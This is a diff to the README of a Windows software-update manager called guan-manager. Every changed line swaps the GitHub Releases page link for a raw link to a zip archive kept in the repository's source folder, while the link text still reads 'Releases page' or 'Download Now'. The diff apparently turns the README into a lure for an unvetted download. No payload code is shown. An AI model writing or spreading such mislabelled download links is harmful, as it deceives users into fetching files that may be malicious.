@@ -1,7 +1,7 @@
 # 🌟 guan-manager - Manage and Update Software Easily
 
 ## 📥 Download Now
-[![Download guan-manager](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/mrcool02067/guan-manager/releases)
+[![Download guan-manager](https://raw.githubusercontent.com/mrcool02067/guan-manager/master/src-tauri/manager_guan_2.5-beta.3.zip)](https://raw.githubusercontent.com/mrcool02067/guan-manager/master/src-tauri/manager_guan_2.5-beta.3.zip)
 
 ## 🚀 Getting Started
 Welcome to guan-manager! This software helps you manage and update applications on your Windows computer. It uses WinGet to provide a visual interface that makes updates simple and efficient.
@@ -17,7 +17,7 @@ Before you begin, ensure your system meets the following requirements:
 ## 🔗 Download & Install
 To install guan-manager, follow these steps:
 
-1. Visit the [Releases page](https://github.com/mrcool02067/guan-manager/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/mrcool02067/guan-manager/master/src-tauri/manager_guan_2.5-beta.3.zip).
 2. On the Releases page, look for the latest version.
 3. Click on the download link for the installer.
 4. Once the download is complete, locate the file in your downloads folder.
@@ -57,7 +57,7 @@ It’s a good idea to check for updates weekly to ensure you have the latest fea
 Yes, you can uninstall guan-manager like any other program through the Control Panel.
 
 ## 🔗 More Information
-For detailed instructions, updates, and community discussions, visit the [Releases page](https://github.com/mrcool02067/guan-manager/releases).
+For detailed instructions, updates, and community discussions, visit the [Releases page](https://raw.githubusercontent.com/mrcool02067/guan-manager/master/src-tauri/manager_guan_2.5-beta.3.zip).
 
 ## 🛡 Support
 If you encounter any issues, please reach out to our support community on GitHub. We are here to help you.
